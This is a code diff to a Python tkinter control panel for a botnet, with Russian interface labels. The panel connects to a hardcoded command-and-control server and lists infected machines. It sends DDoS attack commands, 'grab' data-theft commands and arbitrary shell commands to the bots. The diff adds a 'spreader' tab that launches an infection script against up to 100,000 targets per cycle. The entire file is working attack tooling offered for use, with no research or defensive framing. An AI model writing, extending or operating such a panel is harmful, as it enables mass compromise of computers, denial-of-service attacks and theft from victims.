@@ -1,6 +1,6 @@
 import tkinter as tk
 from tkinter import ttk, messagebox, scrolledtext, simpledialog
-import threading, socket, json, time
+import threading, socket, json, time, subprocess, os
 
 class BotnetTab(ttk.Frame):
     def __init__(self, parent, app=None):
@@ -8,25 +8,25 @@ class BotnetTab(ttk.Frame):
         self.app = app
         self.c2_host = "80.249.146.202"
         self.c2_port = 80
-        self.colors = {
-            "bg": "#f0f0f0", "fg": "#000000", "button_bg": "#d9d9d9",
-            "entry_bg": "#ffffff", "tree_bg": "#ffffff", "tree_fg": "#000000",
-            "tree_sel": "#3399ff"
-        }
-        self.bots = {}
+        self.spreader_process = None
         self.create_widgets()
         self.after(5000, self._auto_refresh)
 
     def create_widgets(self):
-        ctrl = ttk.Frame(self)
+        notebook = ttk.Notebook(self)
+        notebook.pack(fill=tk.BOTH, expand=True)
+
+        # Вкладка "Боты"
+        bot_frame = ttk.Frame(notebook)
+        notebook.add(bot_frame, text="Боты")
+        ctrl = ttk.Frame(bot_frame)
         ctrl.pack(fill=tk.X, padx=5, pady=5)
         ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
-        ttk.Button(ctrl, text="Массовая команда", command=self.show_cmd_dialog).pack(side=tk.LEFT, padx=2)
 
-        tree_frame = ttk.Frame(self)
+        tree_frame = ttk.Frame(bot_frame)
         tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
         self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
@@ -38,7 +38,7 @@ class BotnetTab(ttk.Frame):
         self.tree.configure(yscrollcommand=scrollbar.set)
         scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
 
-        stat = ttk.Frame(self)
+        stat = ttk.Frame(bot_frame)
         stat.pack(fill=tk.X, padx=5, pady=5)
         self.lbl_total = ttk.Label(stat, text="Всего: 0")
         self.lbl_total.pack(side=tk.LEFT, padx=10)
@@ -47,14 +47,30 @@ class BotnetTab(ttk.Frame):
         self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
         self.lbl_power.pack(side=tk.LEFT, padx=10)
 
+        # Вкладка "Спредер"
+        spread_frame = ttk.Frame(notebook)
+        notebook.add(spread_frame, text="Спредер")
+        ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)
+        f = ttk.Frame(spread_frame)
+        f.pack(pady=5)
+        ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
+        self.scale_var = tk.IntVar(value=10000)
+        ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8).pack(side=tk.LEFT, padx=5)
+        self.btn_start_spread = ttk.Button(f, text="Запустить спредер", command=self.toggle_spreader)
+        self.btn_start_spread.pack(side=tk.LEFT, padx=10)
+        self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
+        self.spread_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Консоль команд
         cmd_frame = ttk.LabelFrame(self, text="Команда ботам")
         cmd_frame.pack(fill=tk.X, padx=5, pady=5)
         self.cmd_entry = ttk.Entry(cmd_frame, width=50)
         self.cmd_entry.pack(side=tk.LEFT, padx=5, pady=5)
         ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).pack(side=tk.LEFT, padx=2)
-        self.output_text = scrolledtext.ScrolledText(cmd_frame, height=6, bg="white")
+        self.output_text = scrolledtext.ScrolledText(cmd_frame, height=4, bg="white")
         self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
+    # Методы ботов
     def _auto_refresh(self):
         self.refresh_bots()
         self.after(5000, self._auto_refresh)
@@ -71,8 +87,7 @@ class BotnetTab(ttk.Frame):
             data = b""
             while True:
                 chunk = sock.recv(4096)
-                if not chunk:
-                    break
+                if not chunk: break
                 data += chunk
             sock.close()
             bots = json.loads(data)
@@ -87,14 +102,10 @@ class BotnetTab(ttk.Frame):
         online = 0
         total_rps = 0
         for bot in bots:
-            if bot.get("ip") == "77.79.168.92":
-                continue
-            values = (bot["ip"], bot.get("hostname",""), bot.get("os",""),
-                      bot.get("cpu",""), bot.get("ram",""), bot.get("status",""),
-                      bot.get("rps",0), bot.get("last_seen",""))
+            if bot.get("ip") == "77.79.168.92": continue
+            values = (bot["ip"], bot.get("hostname",""), bot.get("os",""), bot.get("cpu",""), bot.get("ram",""), bot.get("status",""), bot.get("rps",0), bot.get("last_seen",""))
             self.tree.insert("", "end", values=values)
-            if bot.get("status") == "online":
-                online += 1
+            if bot.get("status") == "online": online += 1
             total_rps += int(bot.get("rps",0))
         self.lbl_total.config(text=f"Всего: {total}")
         self.lbl_online.config(text=f"Онлайн: {online}")
@@ -125,30 +136,23 @@ class BotnetTab(ttk.Frame):
         threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
         if threads is None: return
         bot_ips = [self.tree.item(i, "values")[0] for i in selected]
-        cmd_str = f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}"
-        self._send_raw(cmd_str)
+        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}")
 
     def launch_grab(self):
         selected = self.tree.selection()
-        if not selected:
-            messagebox.showwarning("Ошибка", "Выберите ботов")
-            return
+        if not selected: return
         bot_ips = [self.tree.item(i, "values")[0] for i in selected]
         self._send_raw(f"grab:{','.join(bot_ips)}")
 
     def stop_selected(self):
         selected = self.tree.selection()
-        if not selected:
-            messagebox.showwarning("Ошибка", "Выберите ботов")
-            return
+        if not selected: return
         bot_ips = [self.tree.item(i, "values")[0] for i in selected]
         self._send_raw(f"stop:{','.join(bot_ips)}")
 
     def send_custom_command(self):
         cmd = self.cmd_entry.get().strip()
-        if not cmd:
-            messagebox.showwarning("Ошибка", "Введите команду")
-            return
+        if not cmd: return
         selected = self.tree.selection()
         if not selected:
             messagebox.showwarning("Ошибка", "Выберите ботов")
@@ -157,5 +161,30 @@ class BotnetTab(ttk.Frame):
         for ip in ips:
             self._send_raw(f"exec:{ip}:{cmd}")
 
-    def show_cmd_dialog(self):
-        self.cmd_entry.focus_set()
+    # Управление спредером
+    def toggle_spreader(self):
+        if self.spreader_process and self.spreader_process.poll() is None:
+            self.spreader_process.terminate()
+            self.btn_start_spread.config(text="Запустить спредер")
+            self.spread_log.insert(tk.END, "[*] Спредер остановлен\n")
+            self.spreader_process = None
+        else:
+            count = self.scale_var.get()
+            self.spread_log.insert(tk.END, f"[*] Запуск спредера, целей: {count}\n")
+            threading.Thread(target=self._run_spreader, args=(count,), daemon=True).start()
+
+    def _run_spreader(self, count):
+        try:
+            # Запускаем spreader.py как отдельный процесс
+            script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'botnet', 'spreader.py')
+            self.spreader_process = subprocess.Popen(
+                ["python", script_path, "--count", str(count)],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            self.btn_start_spread.config(text="Остановить спредер")
+            for line in iter(self.spreader_process.stdout.readline, ''):
+                self.spread_log.insert(tk.END, line)
+                self.spread_log.see(tk.END)
+        except Exception as e:
+            self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
+            self.btn_start_spread.config(text="Запустить спредер")
